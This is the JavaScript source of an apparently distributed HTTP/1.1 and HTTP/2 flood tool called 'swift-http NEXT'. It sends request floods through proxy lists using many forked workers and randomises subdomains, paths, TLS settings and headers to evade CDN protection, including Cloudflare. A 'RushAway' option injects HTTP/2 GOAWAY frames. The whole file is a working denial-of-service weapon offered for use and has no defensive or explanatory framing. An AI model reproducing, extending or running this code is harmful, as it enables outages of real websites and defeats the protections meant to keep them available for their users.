const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const colors = require('colors');
const crypto = require('crypto');
const argv = require('minimist')(process.argv.slice(2));

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

const errorHandler = error => {
    console.log(error);
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);


const targetT = argv['u'];
const timeT = argv['d'];
const threadsT = argv['t'];
const rateT = argv['r'];

const proxyT = argv['0'];
const sepProxyT = argv['1'];
const userAgentT = argv['h'];
const cookieT = argv['c'];

const randPathT = argv['j'];                // Random path
const randSDomainT = argv['i'];             // Random SubDomain exploit (for cf)
const reqmethodT = argv['m'] || "GET";      // Request method
const httpVersionT = argv['z'];             // HTTP version (1/2)
const randQueryT = argv['q'];               // Random Query String
const rushAwayT = argv['G'];                // RushAway exploit
const cleanModeT = argv['C'];               // Clean mode (without custom headers, etc)

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

const urlT = new URL(targetT);

if (httpVersionT && ![1, 2].includes(httpVersionT)) {
    console.error('Error: http version only can 1/2');
    process.exit(1);
}

if (proxyT && sepProxyT) {
    console.error('пошел нахуй');
    process.exit(1);
}

let proxy;
if (proxyT) {
    try {
        proxy = fs.readFileSync(proxyT, 'utf8').replace(/\r/g, '').split('\n');
    } catch (e) {
        console.log(`Error: proxy file not loaded`);
        process.exit(1);
    }
}

if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethodT)) {
    console.error('Error: request method only can GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);

    return Buffer.concat([frameHeader, statusCode]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randint(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const uas_ios = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:137.0) Gecko/20100101 Firefox/137.0.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.84 Safari/537.36 Edg/135.0.3179.73",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.3179.73",
];

const languages = [
    "ru-RU,ru;q=0.8",
    "en-US,en;q=0.8",
];

const accept = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
];

const encoding = [
    "gzip, deflate, br",
];

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}


function h1builder(pathname) {
    let headers = `${reqmethodT} ${pathname} HTTP/1.1\r\n` +
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n` +
        `Accept-Encoding: gzip, deflate, br\r\n` +
        `Accept-Language: ${languages[Math.floor(Math.random() * languages.length)]}\r\n` +
        'Connection: Keep-Alive\r\n' +
        `Host: ${urlT.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        "X-Requested-With: XMLHttpRequest\r\n" +
        "Pragma: no-cache\r\n" +
        `User-Agent: ${uas_ios[Math.floor(Math.random() * uas_ios.length)]}\r\n`

    headers += "\r\n";

    const result = Buffer.from(`${headers}`, 'binary');
    return result;
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function go() {
    let parsedProxy;

    if (proxyT) {
        parsedProxy = proxy[~~(Math.random() * proxy.length)].split(':');
    } else if (sepProxyT) {
        parsedProxy = sepProxyT.split(':');
    }

    let authString = "";

    let finalProxyPayload = `CONNECT ${urlT.host}:443 HTTP/1.1\r\nHost: ${urlT.host}:443\r\nProxy-Connection: keep-alive\r\n\r\n`;

    let user1, pass1, ip1, port1;

    if (parsedProxy[2] && parsedProxy[3]) {
        user1 = parsedProxy[0];
        pass1 = parsedProxy[1];
        ip1 = parsedProxy[2];
        port1 = parsedProxy[3];
        authString = Buffer.from(`${user1}:${pass1}`).toString('base64');
        finalProxyPayload = `CONNECT ${urlT.host}:443 HTTP/1.1\r\nHost: ${urlT.host}:443\r\nProxy-Authorization: Basic ${authString}\r\nProxy-Connection: keep-alive\r\n\r\n`
    } else {
        ip1 = parsedProxy[0];
        port1 = parsedProxy[1];
    }

    let tlsSocket;

    const netSocket = net.connect(Number(port1), ip1, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: httpVersionT === 1 ? ['http/1.1'] : httpVersionT === 2 ? ['h2'] : Math.random() >= 0.5 ? ['h2'] : ['http/1.1'],
                servername: urlT.host,
                ...(Math.random() < 0.5 && { ciphers: 'ALL:!aPSK:!ECDSA+SHA1:!3DES' }),
                ...(Math.random() < 0.5 && { sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512' }),
                ...(Math.random() < 0.5 && { ecdhCurve: 'X25519:prime256v1:secp384r1' }),
                ...(Math.random() < 0.5 && { secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom }),
                ...(Math.random() < 0.5 && { session: crypto.randomBytes(64) }),
                secure: true,
                rejectUnauthorized: false
            }, () => {
                let pathname = randPathT ? `${urlT.pathname}${randstr(6)}` : urlT.pathname;
                let authority = randSDomainT ? `${getRandomChar()}${randint(1100, 1999)}${getRandomChar()}-${getRandomChar()}${randint(300, 900)}${getRandomChar()}.${urlT.hostname}` : urlT.hostname;

                if (randQueryT) { pathname += `?${randstr(4)}=${randstr(6)}` };

                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    const http1Payload = Buffer.concat(new Array(1).fill(h1builder(pathname)));

                    if (httpVersionT == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    doWrite()
                                }, 50)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite();

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })

                    return;
                }

                if (httpVersionT == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(10485760, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [4, 2097152],
                        [2, 0],
                        [3, 100], // 100
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }

                            if (frame.type == 7 || frame.type == 5) {
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                 tlsSocket.end(() => tlsSocket.destroy())
                                tlsSocket.write(encodeFrame(0, 0x7, Buffer.from([0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8]), 0))
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                //setInterval(() => {
                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }

                    const requests = [];

                    for (let i = 0; i < rateT; i++) {
                        const newts = Date.now() / 1000;
                        const pseudoHeaders = {
                            ":method": reqmethodT,
                            ":scheme": "https",
                            ":path": pathname,
                            ":authority": `${authority}`,
                        };

                        let regularHeaders;
                        let filteredRegularHeaders;
                        let shuffledRegularHeaders;
                        let headers;
                        let combinedHeaders;

                        let userAgent = userAgentT ? `${userAgentT}` : `${uas_ios[Math.floor(Math.random() * uas_ios.length)]}`;

                        if (cleanModeT) {
                            regularHeaders = {
                                "accept": `${accept[Math.floor(Math.random() * accept.length)]}`,
                                ...(Math.random() < 0.5 && { "sec-fetch-site": "same-origin" }),
                                "accept-encoding": `${encoding[Math.floor(Math.random() * encoding.length)]}`,
                                ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                                "user-agent": `${userAgent}`,
                                "accept-language": `${languages[Math.floor(Math.random() * languages.length)]}`,
                                ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                                "upgrade-insecure-requests": "1",

                                ...(cookieT ? { "cookie": cookieT } : {})
                            };

                            filteredRegularHeaders = Object.entries(regularHeaders).filter(([, value]) => value != null);
                            shuffledRegularHeaders = shuffleArray(filteredRegularHeaders);

                            headers = Object.entries(pseudoHeaders).concat(shuffledRegularHeaders);

                            combinedHeaders = headers;

                        } else {
                            regularHeaders = {
                                "accept": `${accept[Math.floor(Math.random() * accept.length)]}`,
                                "sec-fetch-site": "none",
                                "accept-encoding": `${encoding[Math.floor(Math.random() * encoding.length)]}`,
                                "sec-fetch-mode": "navigate",
                                "user-agent": userAgent,
                                "accept-language": `${languages[Math.floor(Math.random() * languages.length)]}`,
                                "sec-fetch-dest": "document",
                                "upgrade-insecure-requests": "1",

                                ...(cookieT ? { "cookie": cookieT } : { "cookie": `` })
                            };

                            filteredRegularHeaders = Object.entries(regularHeaders).filter(([, value]) => value != null);
                            shuffledRegularHeaders = shuffleArray(filteredRegularHeaders);

                            headers = Object.entries(pseudoHeaders).concat(shuffledRegularHeaders);
const headers2 = Object.entries({
    // Randomized headers with natural variations
    ...(Math.random() < 0.4 && { [`client-device-type`]: Math.random() > 0.5 ? "\"Linux\"" : "\"Windows\"" }),
    ...(Math.random() < 0.3 && { [`x-cf-sync`]: Math.random() > 0.5 ? "?0" : "?1" }),
    ...(Math.random() < 0.3 && { [`content-encoding`]: Math.random() > 0.5 ? "gzip, deflate" : "zstd" }),
    ...(Math.random() < 0.3 && { [`server-encoding`]: Math.random() > 0.5 ? "gzip" : "deflate" }),
    ...(Math.random() < 0.3 && { [`x-client-encoding`]: Math.random() > 0.5 ? "br, gzip" : "gzip, deflate" }),

    ...(Math.random() < 0.25 && { [`x-prefer-encryption`]: `${Math.random() > 0.5}` }),
    ...(Math.random() < 0.25 && { [`sec-client-platform`]: Math.random() > 0.5 ? "Linux" : "Windows" }),
    ...(Math.random() < 0.25 && { [`x-content-frame`]: "challenge" }),
    ...(Math.random() < 0.25 && { [`x-cdn-loop`]: Math.random() > 0.5 ? "?1" : "?0" }),
    ...(Math.random() < 0.25 && { [`x-cf-cdn-loop`]: Math.random() > 0.5 ? "0" : "1" }),
    ...(Math.random() < 0.25 && { [`x-response-compression`]: Math.random() > 0.5 ? "gzip" : "zstd" }),
    ...(Math.random() < 0.25 && { [`client-content-encoding`]: "gzip" }),
    ...(Math.random() < 0.25 && { [`sec-protocol-flag`]: `?${Math.round(Math.random())}` }),
    ...(Math.random() < 0.25 && { [`x-client-cdn`]: `?${Math.round(Math.random())}` }),
    ...(Math.random() < 0.25 && { [`x-cf-cdn`]: `?${Math.round(Math.random())}` }),
    ...(Math.random() < 0.25 && { [`x-client-platform`]: Math.random() > 0.5 ? "\"Linux\"" : "\"Windows\"" }),

    // Dynamic values for remaining headers
    ...(Math.random() < 0.25 && { ["sec-client-cert"]: `${Math.random() > 0.7}` }),
    ...(Math.random() < 0.25 && { ["x-edge-status"]: `${Math.round(Math.random() * 5)}` }),
    ...(Math.random() < 0.25 && { ["x-ua-mobile"]: Math.random() > 0.5 ? "?0" : "?1" }),
    ...(Math.random() < 0.25 && { ["sec-fetch-arch"]: Math.random() > 0.5 ? "x86_64" : "arm64" }),
    ...(Math.random() < 0.25 && { ["x-protocol-type"]: Math.random() > 0.5 ? "h2" : "h3" }),
    ...(Math.random() < 0.25 && { ["x-cf-dns-prefetch"]: `${Math.random() > 0.5 ? "?1" : "?0"}` }),

    // Add subtlety to patterns
    ...(Math.random() < 0.25 && { ['x-custom-mode']: Math.random() > 0.5 ? "none" : "default" }),
    ...(Math.random() < 0.25 && { ['x-ui-required']: `${Math.random() > 0.5}` }),
    ...(Math.random() < 0.25 && { ['x-http2-preferred']: `?${Math.round(Math.random())}` }),
    ...(Math.random() < 0.25 && { ['sec-fetch-encoding']: Math.random() > 0.5 ? "gzip" : "deflate" }),
    ...(Math.random() < 0.25 && { ['x-device-sync']: `?${Math.round(Math.random())}` }),
    ...(Math.random() < 0.25 && { ['x-client-crypto']: Math.random() > 0.5 ? "none" : "AES" }),
});

for (let i = headers2.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
}
               combinedHeaders = headers.concat(headers2);
                                      }

// Construct final request
const packed = Buffer.concat([
    Buffer.from([0x80, 0, 0, 0, 0xFF]),
    hpack.encode(combinedHeaders)
]);

               requests.push(encodeFrame(streamId, 1, packed, 0x25));


if (rushAwayT) {
    function encodeGoAway(errorCode) {
        const type = 0x7;
        const streamId = 0;

        const payload = Buffer.alloc(8);
        payload.writeUInt32BE(streamId, 0);
        payload.writeUInt32BE(errorCode, 4);

        return encodeFrame(streamId, type, payload);
    }

                            const ecArray = [
                                0x7,
                                0x8,
                            ];

                            requests.push(encodeGoAway(ecArray[Math.floor(Math.random() * ecArray.length)]));
                        }


                        streamId += 2
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                doWrite()
                            }, 50)

                        } else { }
                    })
                }

                doWrite()
                //}, 500)
            }).on('error', (error) => {
                tlsSocket.destroy()
            })
        })

        netSocket.write(finalProxyPayload);
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })
}

if (cluster.isMaster) {
    console.log(`(${'~'.brightGreen})` + ` swift-http `.brightCyan + `NEXT`.cyan + ` | ` + `Version: ` + `2.2 (Pattern #4)`.brightCyan + ` | ` + `t.me/ySolutions`.brightCyan);
    console.log(`  Host: ` + `${urlT.hostname}`);
    console.log(`  Path: ` + `${urlT.pathname}`);
    console.log(`  Time: ` + `${timeT}`);
    if (proxyT) { console.log(`  Proxy File: ` + `${proxyT}`) } else if (sepProxyT) { console.log(`  Custom Proxy: ` + `${sepProxyT}`) }
    if (userAgentT) { console.log(`  Custom UserAgent: ` + `${userAgentT}`) };
    if (cookieT) { console.log(`  Custom Cookie: ` + `${cookieT}`) };
    if (cleanModeT) { console.log(`  ` + `+`.brightGreen + ` Clean Mode`) };
    if (randSDomainT) { console.log(`  ` + `+`.brightGreen + ` Random Sub Domain`) };
    if (randPathT) { console.log(`  ` + `+`.brightGreen + ` Random Path`) };
    if (randQueryT) { console.log(`  ` + `+`.brightGreen + ` Random Query String`) };
    if (httpVersionT) { console.log(`  ` + `+`.brightGreen + ` Force HTTP version: ${httpVersionT}`) };
    if (rushAwayT) { console.log(`  ` + `+`.brightGreen + ` RushAway Exploit`) };
    console.log(``);

    for (let counter = 1; counter <= threadsT; counter++) {
        cluster.fork();
    }
} else {
    setInterval(() => {
        go();
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, timeT * 1000);